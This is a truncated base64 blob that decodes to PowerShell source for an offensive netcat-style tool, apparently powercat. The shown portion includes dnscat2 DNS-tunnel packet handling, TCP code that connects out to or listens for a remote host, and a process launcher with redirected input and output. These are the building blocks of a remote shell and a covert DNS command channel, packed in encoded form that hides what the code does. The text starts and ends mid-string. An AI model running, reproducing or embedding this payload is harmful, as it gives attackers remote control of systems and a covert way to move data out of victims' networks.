rICREb21haW4pCiAgICB9CiAgICAKICAgIGZ1bmN0aW9uIENyZWF0ZV9GSU4KICAgIHsKICAgICAgcGFyYW0oJFNlc3Npb25JZCwkVGFnLCREb21haW4pCiAgICAgIHJldHVybiAoJFRhZyArIChbc3RyaW5nXShHZXQtUmFuZG9tIC1NYXhpbXVtIDk5OTkgLU1pbmltdW0gMTAwMCkpICsgIi4wMi4iICsgJFNlc3Npb25JZCArICIuMDAiICsgJERvbWFpbikKICAgIH0KICAgIAogICAgZnVuY3Rpb24gQ3JlYXRlX01TRwogICAgewogICAgICBwYXJhbSgkU2Vzc2lvbklkLCRTZXFOdW0sJEFja25vd2xlZGdlbWVudE51bWJlciwkRGF0YSwkVGFnLCREb21haW4pCiAgICAgIGlmKCREYXRhIC1lcSAiIil7JERhdGEgPSAiMDAwMCJ9CiAgICAgIHJldHVybiAoJFRhZyArIChbc3RyaW5nXShHZXQtUmFuZG9tIC1NYXhpbXVtIDk5OTkgLU1pbmltdW0gMTAwMCkpICsgIi4wMS4iICsgJFNlc3Npb25JZCArICIuIiArICRTZXFOdW0gKyAiLiIgKyAkQWNrbm93bGVkZ2VtZW50TnVtYmVyICsgIi4iICsgJERhdGEgKyAkRG9tYWluKQogICAgfQogICAgCiAgICBmdW5jdGlvbiBEZWNvZGVQYWNrZXQKICAgIHsKICAgICAgcGFyYW0oJFBhY2tldCkKICAgICAgCiAgICAgIGlmKCgoJFBhY2tldC5MZW5ndGgpJTIgLWVxIDEpIC1vciAoJFBhY2tldC5MZW5ndGggLWVxIDApKXtyZXR1cm4gMX0KICAgICAgJEFja25vd2xlZGdlbWVudE51bWJlciA9ICgkUGFja2V0WzEwLi4xM10gLWpvaW4gIiIpCiAgICAgICRTZXFOdW0gPSAoJFBhY2tldFsxNC4uMTddIC1qb2luICIiKQogICAgICBbYnl0ZVtdXSRSZXR1cm5pbmdEYXRhID0gQCgpCiAgICAgIAogICAgICBpZigkUGFja2V0Lkxlbmd0aCAtZ3QgMTgpCiAgICAgIHsKICAgICAgICAkUGFja2V0RWxpbSA9ICRQYWNrZXQuU3Vic3RyaW5nKDE4KQogICAgICAgIHdoaWxlKCRQYWNrZXRFbGltLkxlbmd0aCAtZ3QgMCkKICAgICAgICB7CiAgICAgICAgICAkUmV0dXJuaW5nRGF0YSArPSBbYnl0ZVtdXVtDb252ZXJ0XTo6VG9JbnQxNigoJFBhY2tldEVsaW1bMC4uMV0gLWpvaW4gIiIpLDE2KQogICAgICAgICAgJFBhY2tldEVsaW0gPSAkUGFja2V0RWxpbS5TdWJzdHJpbmcoMikKICAgICAgICB9CiAgICAgIH0KICAgICAgCiAgICAgIHJldHVybiAkUGFja2V0LCRSZXR1cm5pbmdEYXRhLCRBY2tub3dsZWRnZW1lbnROdW1iZXIsJFNlcU51bQogICAgfQogICAgCiAgICBmdW5jdGlvbiBBY2tub3dsZWRnZURhdGEKICAgIHsKICAgICAgcGFyYW0oJFJldHVybmluZ0RhdGEsJEFja25vd2xlZGdlbWVudE51bWJlcikKICAgICAgJEhleCA9IFtzdHJpbmddKCJ7MDp4fSIgLWYgKChbdWludDE2XSgiMHgiICsgJEFja25vd2xlZGdlbWVudE51bWJlcikgKyAkUmV0dXJuaW5nRGF0YS5MZW5ndGgpICUgNjU1MzUpKQogICAgICBpZigkSGV4Lkxlbmd0aCAtbmUgNCl7JEhleCA9ICgoIjAiKig0LSRIZXguTGVuZ3RoKSkgKyAkSGV4KX0KICAgICAgcmV0dXJuICRIZXgKICAgIH0KICAgICRGdW5jVmFycyA9IEB7fQogICAgJEZ1bmNWYXJzWyJETlNTZXJ2ZXIiXSwkRnVuY1ZhcnNbIkROU1BvcnQiXSwkRnVuY1ZhcnNbIkRvbWFpbiJdLCRGdW5jVmFyc1siRmFpbHVyZVRocmVzaG9sZCJdID0gJEZ1bmNTZXR1cFZhcnMKICAgIGlmKCRGdW5jVmFyc1siRE5TUG9ydCJdIC1lcSAnJyl7JEZ1bmNWYXJzWyJETlNQb3J0Il0gPSAiNTMifQogICAgJEZ1bmNWYXJzWyJUYWciXSA9ICJkbnNjYXQuIgogICAgaWYoJEZ1bmNWYXJzWyJEb21haW4iXSAtbmUgIiIpCiAgICB7CiAgICAgICRGdW5jVmFyc1siVGFnIl0gPSAiIgogICAgICAkRnVuY1ZhcnNbIkRvbWFpbiJdID0gKCIuIiArICRGdW5jVmFyc1siRG9tYWluIl0pCiAgICB9CiAgICAKICAgICRGdW5jVmFyc1siQ3JlYXRlX1NZTiJdID0gJHtmdW5jdGlvbjpDcmVhdGVfU1lOfQogICAgJEZ1bmNWYXJzWyJDcmVhdGVfTVNHIl0gPSAke2Z1bmN0aW9uOkNyZWF0ZV9NU0d9CiAgICAkRnVuY1ZhcnNbIkNyZWF0ZV9GSU4iXSA9ICR7ZnVuY3Rpb246Q3JlYXRlX0ZJTn0KICAgICRGdW5jVmFyc1siRGVjb2RlUGFja2V0Il0gPSAke2Z1bmN0aW9uOkRlY29kZVBhY2tldH0KICAgICRGdW5jVmFyc1siQ29udmVydFRvLUhleEFycmF5Il0gPSAke2Z1bmN0aW9uOkNvbnZlcnRUby1IZXhBcnJheX0KICAgICRGdW5jVmFyc1siQWNrRGF0YSJdID0gJHtmdW5jdGlvbjpBY2tub3dsZWRnZURhdGF9CiAgICAkRnVuY1ZhcnNbIlNlbmRQYWNrZXQiXSA9ICR7ZnVuY3Rpb246U2VuZFBhY2tldH0KICAgICRGdW5jVmFyc1siU2Vzc2lvbklkIl0gPSAoW3N0cmluZ10oR2V0LVJhbmRvbSAtTWF4aW11bSA5OTk5IC1NaW5pbXVtIDEwMDApKQogICAgJEZ1bmNWYXJzWyJTZXFOdW0iXSA9IChbc3RyaW5nXShHZXQtUmFuZG9tIC1NYXhpbXVtIDk5OTkgLU1pbmltdW0gMTAwMCkpCiAgICAkRnVuY1ZhcnNbIkVuY29kaW5nIl0gPSBOZXctT2JqZWN0IFN5c3RlbS5UZXh0LkFzY2lpRW5jb2RpbmcKICAgICRGdW5jVmFyc1siRmFpbHVyZXMiXSA9IDAKICAgIAogICAgJFNZTlBhY2tldCA9IChJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIkNyZWF0ZV9TWU4iXSAtQXJndW1lbnRMaXN0IEAoJEZ1bmNWYXJzWyJTZXNzaW9uSWQiXSwkRnVuY1ZhcnNbIlNlcU51bSJdLCRGdW5jVmFyc1siVGFnIl0sJEZ1bmNWYXJzWyJEb21haW4iXSkpCiAgICAkUmVzcG9uc2VQYWNrZXQgPSAoSW52b2tlLUNvbW1hbmQgJEZ1bmNWYXJzWyJTZW5kUGFja2V0Il0gLUFyZ3VtZW50TGlzdCBAKCRTWU5QYWNrZXQsJEZ1bmNWYXJzWyJETlNTZXJ2ZXIiXSwkRnVuY1ZhcnNbIkROU1BvcnQiXSkpCiAgICAkRGVjb2RlZFBhY2tldCA9IChJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIkRlY29kZVBhY2tldCJdIC1Bcmd1bWVudExpc3QgQCgkUmVzcG9uc2VQYWNrZXQpKQogICAgaWYoJERlY29kZWRQYWNrZXQgLWVxIDEpe3JldHVybiAiQmFkIFNZTiByZXNwb25zZS4gRW5zdXJlIHlvdXIgc2VydmVyIGlzIHNldCB1cCBjb3JyZWN0bHkuIn0KICAgICRSZXR1cm5pbmdEYXRhID0gJERlY29kZWRQYWNrZXRbMV0KICAgIGlmKCRSZXR1cm5pbmdEYXRhIC1uZSAiIil7JEZ1bmNWYXJzWyJJbnB1dERhdGEiXSA9ICIifQogICAgJEZ1bmNWYXJzWyJBY2tOdW0iXSA9ICREZWNvZGVkUGFja2V0WzJdCiAgICAkRnVuY1ZhcnNbIk1heE1TR0RhdGFTaXplIl0gPSAoMjUwIC0gKEludm9rZS1Db21tYW5kICRGdW5jVmFyc1siQ3JlYXRlX01TRyJdIC1Bcmd1bWVudExpc3QgQCgkRnVuY1ZhcnNbIlNlc3Npb25JZCJdLCRGdW5jVmFyc1siU2VxTnVtIl0sJEZ1bmNWYXJzWyJBY2tOdW0iXSwiIiwkRnVuY1ZhcnNbIlRhZyJdLCRGdW5jVmFyc1siRG9tYWluIl0pKS5MZW5ndGgpCiAgICBpZigkRnVuY1ZhcnNbIk1heE1TR0RhdGFTaXplIl0gLWxlIDApe3JldHVybiAiRG9tYWluIG5hbWUgaXMgdG9vIGxvbmcuIn0KICAgIHJldHVybiAkRnVuY1ZhcnMKICB9CiAgZnVuY3Rpb24gUmVhZERhdGFfRE5TCiAgewogICAgcGFyYW0oJEZ1bmNWYXJzKQogICAgaWYoJGdsb2JhbDpWZXJib3NlKXskVmVyYm9zZSA9ICRUcnVlfQogICAgCiAgICAkUGFja2V0c0RhdGEgPSBAKCkKICAgICRQYWNrZXREYXRhID0gIiIKICAgIAogICAgaWYoJEZ1bmNWYXJzWyJJbnB1dERhdGEiXSAtbmUgJG51bGwpCiAgICB7CiAgICAgICRIZXggPSAoSW52b2tlLUNvbW1hbmQgJEZ1bmNWYXJzWyJDb252ZXJ0VG8tSGV4QXJyYXkiXSAtQXJndW1lbnRMaXN0IEAoJEZ1bmNWYXJzWyJJbnB1dERhdGEiXSkpCiAgICAgICRTZWN0aW9uQ291bnQgPSAwCiAgICAgICRQYWNrZXRDb3VudCA9IDAKICAgICAgZm9yZWFjaCgkQ2hhciBpbiAkSGV4KQogICAgICB7CiAgICAgICAgaWYoJFNlY3Rpb25Db3VudCAtZ2UgMzApCiAgICAgICAgewogICAgICAgICAgJFNlY3Rpb25Db3VudCA9IDAKICAgICAgICAgICRQYWNrZXREYXRhICs9ICIuIgogICAgICAgIH0KICAgICAgICBpZigkUGFja2V0Q291bnQgLWdlICgkRnVuY1ZhcnNbIk1heE1TR0RhdGFTaXplIl0pKQogICAgICAgIHsKICAgICAgICAgICRQYWNrZXRzRGF0YSArPSAkUGFja2V0RGF0YS5UcmltRW5kKCIuIikKICAgICAgICAgICRQYWNrZXRDb3VudCA9IDAKICAgICAgICAgICRTZWN0aW9uQ291bnQgPSAwCiAgICAgICAgICAkUGFja2V0RGF0YSA9ICIiCiAgICAgICAgfQogICAgICAgICRQYWNrZXREYXRhICs9ICRDaGFyCiAgICAgICAgJFNlY3Rpb25Db3VudCArPSAyCiAgICAgICAgJFBhY2tldENvdW50ICs9IDIKICAgICAgfQogICAgICAkUGFja2V0RGF0YSA9ICRQYWNrZXREYXRhLlRyaW1FbmQoIi4iKQogICAgICAkUGFja2V0c0RhdGEgKz0gJFBhY2tldERhdGEKICAgICAgJEZ1bmNWYXJzWyJJbnB1dERhdGEiXSA9ICIiCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICRQYWNrZXRzRGF0YSA9IEAoIjAwMDAiKQogICAgfQogICAgCiAgICBbYnl0ZVtdXSRSZXR1cm5pbmdEYXRhID0gQCgpCiAgICBmb3JlYWNoKCRQYWNrZXREYXRhIGluICRQYWNrZXRzRGF0YSkKICAgIHsKICAgICAgdHJ5eyRNU0dQYWNrZXQgPSBJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIkNyZWF0ZV9NU0ciXSAtQXJndW1lbnRMaXN0IEAoJEZ1bmNWYXJzWyJTZXNzaW9uSWQiXSwkRnVuY1ZhcnNbIlNlcU51bSJdLCRGdW5jVmFyc1siQWNrTnVtIl0sJFBhY2tldERhdGEsJEZ1bmNWYXJzWyJUYWciXSwkRnVuY1ZhcnNbIkRvbWFpbiJdKX0KICAgICAgY2F0Y2h7IFdyaXRlLVZlcmJvc2UgIkROU0NBVDI6IEZhaWxlZCB0byBjcmVhdGUgcGFja2V0LiIgOyAkRnVuY1ZhcnNbIkZhaWx1cmVzIl0gKz0gMSA7IGNvbnRpbnVlIH0KICAgICAgdHJ5eyRQYWNrZXQgPSAoSW52b2tlLUNvbW1hbmQgJEZ1bmNWYXJzWyJTZW5kUGFja2V0Il0gLUFyZ3VtZW50TGlzdCBAKCRNU0dQYWNrZXQsJEZ1bmNWYXJzWyJETlNTZXJ2ZXIiXSwkRnVuY1ZhcnNbIkROU1BvcnQiXSkpfQogICAgICBjYXRjaHsgV3JpdGUtVmVyYm9zZSAiRE5TQ0FUMjogRmFpbGVkIHRvIHNlbmQgcGFja2V0LiIgOyAkRnVuY1ZhcnNbIkZhaWx1cmVzIl0gKz0gMSA7IGNvbnRpbnVlIH0KICAgICAgdHJ5CiAgICAgIHsKICAgICAgICAkRGVjb2RlZFBhY2tldCA9IChJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIkRlY29kZVBhY2tldCJdIC1Bcmd1bWVudExpc3QgQCgkUGFja2V0KSkKICAgICAgICBpZigkRGVjb2RlZFBhY2tldC5MZW5ndGggLW5lIDQpeyBXcml0ZS1WZXJib3NlICJETlNDQVQyOiBGYWlsdXJlIHRvIGRlY29kZSBwYWNrZXQsIGRyb3BwaW5nLi4uIjsgJEZ1bmNWYXJzWyJGYWlsdXJlcyJdICs9IDEgOyBjb250aW51ZSB9CiAgICAgICAgJEZ1bmNWYXJzWyJBY2tOdW0iXSA9ICREZWNvZGVkUGFja2V0WzJdCiAgICAgICAgJEZ1bmNWYXJzWyJTZXFOdW0iXSA9ICREZWNvZGVkUGFja2V0WzNdCiAgICAgICAgJFJldHVybmluZ0RhdGEgKz0gJERlY29kZWRQYWNrZXRbMV0KICAgICAgfQogICAgICBjYXRjaHsgV3JpdGUtVmVyYm9zZSAiRE5TQ0FUMjogRmFpbHVyZSB0byBkZWNvZGUgcGFja2V0LCBkcm9wcGluZy4uLiIgOyAkRnVuY1ZhcnNbIkZhaWx1cmVzIl0gKz0gMSA7IGNvbnRpbnVlIH0KICAgICAgaWYoJERlY29kZWRQYWNrZXQgLWVxIDEpeyBXcml0ZS1WZXJib3NlICJETlNDQVQyOiBGYWlsdXJlIHRvIGRlY29kZSBwYWNrZXQsIGRyb3BwaW5nLi4uIiA7ICRGdW5jVmFyc1siRmFpbHVyZXMiXSArPSAxIDsgY29udGludWUgfQogICAgfQogICAgCiAgICBpZigkRnVuY1ZhcnNbIkZhaWx1cmVzIl0gLWdlICRGdW5jVmFyc1siRmFpbHVyZVRocmVzaG9sZCJdKXticmVha30KICAgIAogICAgaWYoJFJldHVybmluZ0RhdGEgLW5lIEAoKSkKICAgIHsKICAgICAgJEZ1bmNWYXJzWyJBY2tOdW0iXSA9IChJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIkFja0RhdGEiXSAtQXJndW1lbnRMaXN0IEAoJFJldHVybmluZ0RhdGEsJEZ1bmNWYXJzWyJBY2tOdW0iXSkpCiAgICB9CiAgICByZXR1cm4gJFJldHVybmluZ0RhdGEsJEZ1bmNWYXJzCiAgfQogIGZ1bmN0aW9uIFdyaXRlRGF0YV9ETlMKICB7CiAgICBwYXJhbSgkRGF0YSwkRnVuY1ZhcnMpCiAgICAkRnVuY1ZhcnNbIklucHV0RGF0YSJdID0gJEZ1bmNWYXJzWyJFbmNvZGluZyJdLkdldFN0cmluZygkRGF0YSkKICAgIHJldHVybiAkRnVuY1ZhcnMKICB9CiAgZnVuY3Rpb24gQ2xvc2VfRE5TCiAgewogICAgcGFyYW0oJEZ1bmNWYXJzKQogICAgJEZJTlBhY2tldCA9IEludm9rZS1Db21tYW5kICRGdW5jVmFyc1siQ3JlYXRlX0ZJTiJdIC1Bcmd1bWVudExpc3QgQCgkRnVuY1ZhcnNbIlNlc3Npb25JZCJdLCRGdW5jVmFyc1siVGFnIl0sJEZ1bmNWYXJzWyJEb21haW4iXSkKICAgIEludm9rZS1Db21tYW5kICRGdW5jVmFyc1siU2VuZFBhY2tldCJdIC1Bcmd1bWVudExpc3QgQCgkRklOUGFja2V0LCRGdW5jVmFyc1siRE5TU2VydmVyIl0sJEZ1bmNWYXJzWyJETlNQb3J0Il0pIHwgT3V0LU51bGwKICB9CiAgIyMjIyMjIyMjIyMjIyMjIEROUyBGVU5DVElPTlMgIyMjIyMjIyMjIyMjIyMjCiAgCiAgIyMjIyMjIyMjIyBUQ1AgRlVOQ1RJT05TICMjIyMjIyMjIyMKICBmdW5jdGlvbiBTZXR1cF9UQ1AKICB7CiAgICBwYXJhbSgkRnVuY1NldHVwVmFycykKICAgICRjLCRsLCRwLCR0ID0gJEZ1bmNTZXR1cFZhcnMKICAgIGlmKCRnbG9iYWw6VmVyYm9zZSl7JFZlcmJvc2UgPSAkVHJ1ZX0KICAgICRGdW5jVmFycyA9IEB7fQogICAgaWYoISRsKQogICAgewogICAgICAkRnVuY1ZhcnNbImwiXSA9ICRGYWxzZQogICAgICAkU29ja2V0ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVGNwQ2xpZW50CiAgICAgIFdyaXRlLVZlcmJvc2UgIkNvbm5lY3RpbmcuLi4iCiAgICAgICRIYW5kbGUgPSAkU29ja2V0LkJlZ2luQ29ubmVjdCgkYywkcCwkbnVsbCwkbnVsbCkKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgJEZ1bmNWYXJzWyJsIl0gPSAkVHJ1ZQogICAgICBXcml0ZS1WZXJib3NlICgiTGlzdGVuaW5nIG9uIFswLjAuMC4wXSAocG9ydCAiICsgJHAgKyAiKSIpCiAgICAgICRTb2NrZXQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UY3BMaXN0ZW5lciAkcAogICAgICAkU29ja2V0LlN0YXJ0KCkKICAgICAgJEhhbmRsZSA9ICRTb2NrZXQuQmVnaW5BY2NlcHRUY3BDbGllbnQoJG51bGwsICRudWxsKQogICAgfQogICAgCiAgICAkU3RvcHdhdGNoID0gW1N5c3RlbS5EaWFnbm9zdGljcy5TdG9wd2F0Y2hdOjpTdGFydE5ldygpCiAgICB3aGlsZSgkVHJ1ZSkKICAgIHsKICAgICAgaWYoJEhvc3QuVUkuUmF3VUkuS2V5QXZhaWxhYmxlKQogICAgICB7CiAgICAgICAgaWYoQCgxNywyNykgLWNvbnRhaW5zICgkSG9zdC5VSS5SYXdVSS5SZWFkS2V5KCJOb0VjaG8sSW5jbHVkZUtleURvd24iKS5WaXJ0dWFsS2V5Q29kZSkpCiAgICAgICAgewogICAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ1RSTCBvciBFU0MgY2F1Z2h0LiBTdG9wcGluZyBUQ1AgU2V0dXAuLi4iCiAgICAgICAgICBpZigkRnVuY1ZhcnNbImwiXSl7JFNvY2tldC5TdG9wKCl9CiAgICAgICAgICBlbHNleyRTb2NrZXQuQ2xvc2UoKX0KICAgICAgICAgICRTdG9wd2F0Y2guU3RvcCgpCiAgICAgICAgICBicmVhawogICAgICAgIH0KICAgICAgfQogICAgICBpZigkU3RvcHdhdGNoLkVsYXBzZWQuVG90YWxTZWNvbmRzIC1ndCAkdCkKICAgICAgewogICAgICAgIGlmKCEkbCl7JFNvY2tldC5DbG9zZSgpfQogICAgICAgIGVsc2V7JFNvY2tldC5TdG9wKCl9CiAgICAgICAgJFN0b3B3YXRjaC5TdG9wKCkKICAgICAgICBXcml0ZS1WZXJib3NlICJUaW1lb3V0ISIgOyBicmVhawogICAgICAgIGJyZWFrCiAgICAgIH0KICAgICAgaWYoJEhhbmRsZS5Jc0NvbXBsZXRlZCkKICAgICAgewogICAgICAgIGlmKCEkbCkKICAgICAgICB7CiAgICAgICAgICB0cnkKICAgICAgICAgIHsKICAgICAgICAgICAgJFNvY2tldC5FbmRDb25uZWN0KCRIYW5kbGUpCiAgICAgICAgICAgICRTdHJlYW0gPSAkU29ja2V0LkdldFN0cmVhbSgpCiAgICAgICAgICAgICRCdWZmZXJTaXplID0gJFNvY2tldC5SZWNlaXZlQnVmZmVyU2l6ZQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICgiQ29ubmVjdGlvbiB0byAiICsgJGMgKyAiOiIgKyAkcCArICIgW3RjcF0gc3VjY2VlZWRlZCEiKQogICAgICAgICAgfQogICAgICAgICAgY2F0Y2h7JFNvY2tldC5DbG9zZSgpOyAkU3RvcHdhdGNoLlN0b3AoKTsgYnJlYWt9CiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAkQ2xpZW50ID0gJFNvY2tldC5FbmRBY2NlcHRUY3BDbGllbnQoJEhhbmRsZSkKICAgICAgICAgICRTdHJlYW0gPSAkQ2xpZW50LkdldFN0cmVhbSgpCiAgICAgICAgICAkQnVmZmVyU2l6ZSA9ICRDbGllbnQuUmVjZWl2ZUJ1ZmZlclNpemUKICAgICAgICAgIFdyaXRlLVZlcmJvc2UgKCJDb25uZWN0aW9uIGZyb20gWyIgKyAkQ2xpZW50LkNsaWVudC5SZW1vdGVFbmRQb2ludC5BZGRyZXNzLklQQWRkcmVzc1RvU3RyaW5nICsgIl0gcG9ydCAiICsgJHBvcnQgKyAiIFt0Y3BdIGFjY2VwdGVkIChzb3VyY2UgcG9ydCAiICsgJENsaWVudC5DbGllbnQuUmVtb3RlRW5kUG9pbnQuUG9ydCArICIpIikKICAgICAgICB9CiAgICAgICAgYnJlYWsKICAgICAgfQogICAgfQogICAgJFN0b3B3YXRjaC5TdG9wKCkKICAgIGlmKCRTb2NrZXQgLWVxICRudWxsKXticmVha30KICAgICRGdW5jVmFyc1siU3RyZWFtIl0gPSAkU3RyZWFtCiAgICAkRnVuY1ZhcnNbIlNvY2tldCJdID0gJFNvY2tldAogICAgJEZ1bmNWYXJzWyJCdWZmZXJTaXplIl0gPSAkQnVmZmVyU2l6ZQogICAgJEZ1bmNWYXJzWyJTdHJlYW1EZXN0aW5hdGlvbkJ1ZmZlciJdID0gKE5ldy1PYmplY3QgU3lzdGVtLkJ5dGVbXSAkRnVuY1ZhcnNbIkJ1ZmZlclNpemUiXSkKICAgICRGdW5jVmFyc1siU3RyZWFtUmVhZE9wZXJhdGlvbiJdID0gJEZ1bmNWYXJzWyJTdHJlYW0iXS5CZWdpblJlYWQoJEZ1bmNWYXJzWyJTdHJlYW1EZXN0aW5hdGlvbkJ1ZmZlciJdLCAwLCAkRnVuY1ZhcnNbIkJ1ZmZlclNpemUiXSwgJG51bGwsICRudWxsKQogICAgJEZ1bmNWYXJzWyJFbmNvZGluZyJdID0gTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5Bc2NpaUVuY29kaW5nCiAgICAkRnVuY1ZhcnNbIlN0cmVhbUJ5dGVzUmVhZCJdID0gMQogICAgcmV0dXJuICRGdW5jVmFycwogIH0KICBmdW5jdGlvbiBSZWFkRGF0YV9UQ1AKICB7CiAgICBwYXJhbSgkRnVuY1ZhcnMpCiAgICAkRGF0YSA9ICRudWxsCiAgICBpZigkRnVuY1ZhcnNbIlN0cmVhbUJ5dGVzUmVhZCJdIC1lcSAwKXticmVha30KICAgIGlmKCRGdW5jVmFyc1siU3RyZWFtUmVhZE9wZXJhdGlvbiJdLklzQ29tcGxldGVkKQogICAgewogICAgICAkU3RyZWFtQnl0ZXNSZWFkID0gJEZ1bmNWYXJzWyJTdHJlYW0iXS5FbmRSZWFkKCRGdW5jVmFyc1siU3RyZWFtUmVhZE9wZXJhdGlvbiJdKQogICAgICBpZigkU3RyZWFtQnl0ZXNSZWFkIC1lcSAwKXticmVha30KICAgICAgJERhdGEgPSAkRnVuY1ZhcnNbIlN0cmVhbURlc3RpbmF0aW9uQnVmZmVyIl1bMC4uKFtpbnRdJFN0cmVhbUJ5dGVzUmVhZC0xKV0KICAgICAgJEZ1bmNWYXJzWyJTdHJlYW1SZWFkT3BlcmF0aW9uIl0gPSAkRnVuY1ZhcnNbIlN0cmVhbSJdLkJlZ2luUmVhZCgkRnVuY1ZhcnNbIlN0cmVhbURlc3RpbmF0aW9uQnVmZmVyIl0sIDAsICRGdW5jVmFyc1siQnVmZmVyU2l6ZSJdLCAkbnVsbCwgJG51bGwpCiAgICB9CiAgICByZXR1cm4gJERhdGEsJEZ1bmNWYXJzCiAgfQogIGZ1bmN0aW9uIFdyaXRlRGF0YV9UQ1AKICB7CiAgICBwYXJhbSgkRGF0YSwkRnVuY1ZhcnMpCiAgICAkRnVuY1ZhcnNbIlN0cmVhbSJdLldyaXRlKCREYXRhLCAwLCAkRGF0YS5MZW5ndGgpCiAgICByZXR1cm4gJEZ1bmNWYXJzCiAgfQogIGZ1bmN0aW9uIENsb3NlX1RDUAogIHsKICAgIHBhcmFtKCRGdW5jVmFycykKICAgIHRyeXskRnVuY1ZhcnNbIlN0cmVhbSJdLkNsb3NlKCl9CiAgICBjYXRjaHt9CiAgICBpZigkRnVuY1ZhcnNbImwiXSl7JEZ1bmNWYXJzWyJTb2NrZXQiXS5TdG9wKCl9CiAgICBlbHNleyRGdW5jVmFyc1siU29ja2V0Il0uQ2xvc2UoKX0KICB9CiAgIyMjIyMjIyMjIyBUQ1AgRlVOQ1RJT05TICMjIyMjIyMjIyMKICAKICAjIyMjIyMjIyMjIENNRCBGVU5DVElPTlMgIyMjIyMjIyMjIwogIGZ1bmN0aW9uIFNldHVwX0NNRAogIHsKICAgIHBhcmFtKCRGdW5jU2V0dXBWYXJzKQogICAgaWYoJGdsb2JhbDpWZXJib3NlKXskVmVyYm9zZSA9ICRUcnVlfQogICAgJEZ1bmNWYXJzID0gQHt9CiAgICAkUHJvY2Vzc1N0YXJ0SW5mbyA9IE5ldy1PYmplY3QgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NTdGFydEluZm8KICAgICRQcm9jZXNzU3RhcnRJbmZvLkZpbGVOYW1lID0gJEZ1bmNTZXR1cFZhcnNbMF0KICAgICRQcm9jZXNzU3RhcnRJbmZvLlVzZVNoZWxsRXhlY3V0ZSA9ICRGYWxzZQogICAgJFByb2Nlc3NTdGFydEluZm8uUmVkaXJlY3RTdGFuZGFyZElucHV0ID0gJFRydWUKICAgICRQcm9jZXNzU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRPdXRwdXQgPSAkVHJ1ZQogICAgJFByb2Nlc3NTdGFydEluZm8uUmVkaXJlY3RTdGFuZGFyZEVycm9yID0gJFRydWUKICAgICRGdW5jVmFyc1siUHJvY2VzcyJdID0gW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzXTo6U3RhcnQoJFByb2Nlc3NTdGFydEluZm8pCiAgICBXcml0ZS1WZXJib3NlICgiU3RhcnRpbmcgUHJvY2VzcyAiICsgJEZ1bmNTZXR1cFZhcnNbMF0gKyAiLi4uIikKICAgICRGdW5jVmFyc1siUHJvY2VzcyJdLlN0YXJ0KCkgfCBPdXQtTnVsbAogICAgJEZ1bmNWYXJzWyJTdGRPdXREZXN0aW5hdGlvbkJ1ZmZlciJdID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdIDY1NTM2CiAgICAkRnVuY1ZhcnNbIlN0ZE91dFJlYWRPcGVyYXRpb24iXSA9ICRGdW5jVmFyc1siUHJvY2VzcyJdLlN0YW5kYXJkT3V0cHV0LkJhc2VTdHJlYW0uQmVnaW5SZWFkKCRGdW5jVmFyc1siU3RkT3V0RGVzdGluYXRpb25CdWZmZXIiXSwgMCwgNjU1MzYsICRudWxsLCAkbnVsbCkKICAgICRGdW5jVmFyc1siU3RkRXJyRGVzdGluYXRpb25CdWZmZXIiXSA9IE5ldy1PYmplY3QgU3lzdGVtLkJ5dGVbXSA2NTUzNgogICAgJEZ1bmNWYXJzWyJTdGRFcnJSZWFkT3BlcmF0aW9uIl0gPSAkRnVuY1ZhcnNbIlByb2Nlc3MiXS5TdGFuZGFyZEVycm9yLkJhc2VTdHJlYW0uQmVnaW5SZWFkKCRGdW5jVmFyc1siU3RkRXJyRGVzdGluYXRpb25CdWZmZXIiXSwgMCwgNjU1MzYsICRudWxsLCAkbnVsbCkKICAgICRGdW5jVmFyc1siRW5jb2RpbmciXSA9IE5ldy1PYmplY3QgU3lzdGVtLlRleHQuQXNjaWlFbmNvZGluZwogICAgcmV0dXJuICRGdW5jVmFycwogIH0KICBmdW5jdGlvbiBSZWFkRGF0YV9DTUQKICB7CiAgICBwYXJhbSgkRnVuY1ZhcnMpCiAgICBbYnl0ZVtdXSREYXRhID0gQCgpCiAgICBpZigkRnVuY1ZhcnNbIlN0ZE91dFJlYWRPcGVyYXRpb24iXS5Jc0NvbXBsZXRlZCkKICAgIHsKICAgICAgJFN0ZE91dEJ5dGVzUmVhZCA9ICRGdW5jVmFyc1siUHJvY2VzcyJdLlN0YW5kYXJkT3V0cHV0LkJhc2VTdHJlYW0uRW5kUmVhZCgkRnVuY1ZhcnNbIlN0ZE91dFJlYWRPcGVyYXRpb24iXSkKICAgICAgaWYoJFN0ZE91dEJ5dGVzUmVhZCAtZXEgMCl7YnJlYWt9CiAgICAgICREYXRhICs9ICRGdW5jVmFyc1siU3RkT3V0RGVzdGluYXRpb25CdWZmZXIiXVswLi4oW2ludF0kU3RkT3V0Qnl0ZXNSZWFkLTEpXQogICAgICAkRnVuY1ZhcnNbIlN0ZE91dFJlYWRPcGVyYXRpb24iXSA9ICRGdW5jVmFyc1siUHJvY2VzcyJdLlN0YW5kYXJkT3V0cHV0LkJhc2VTdHJlYW0uQmVnaW5SZWFkKCRGdW5jVmFyc1siU3RkT3V0RGVzdGluYXRpb25CdWZmZXIiXSwgMCwgNjU1MzYsICRudWxsLCAkbnVsbCkKICAgIH0KICAgIGlmKCRGdW5jVmFyc1siU3RkRXJyUmVhZE9wZXJhdGlvbiJdLklzQ29tcGxldGVkKQogICAgewogICAgICAkU3RkRXJyQnl0ZXNSZWFkID0gJEZ1bmNWYXJzWyJQcm9jZXNzIl0uU3RhbmRhcmRFcnJvci5CYXNlU3RyZWFtLkVuZFJlYWQoJEZ1bmNWYXJzWyJTdGRFcnJSZWFkT3BlcmF0aW9uIl0pCiAgICAgIGlmKCRTdGRFcnJCe